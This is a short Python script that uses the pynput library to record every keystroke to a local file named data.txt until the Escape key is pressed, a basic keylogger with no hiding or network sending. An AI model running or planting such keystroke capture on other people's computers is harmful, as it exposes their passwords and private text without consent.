from pynput.keyboard import Key, Listener


def on_press(key):
    f = open('data.txt', 'a')
    f.write(str(key))
    if key == Key.esc:
        f.close()
        return False


with Listener(on_press=on_press) as listener:
    listener.join()
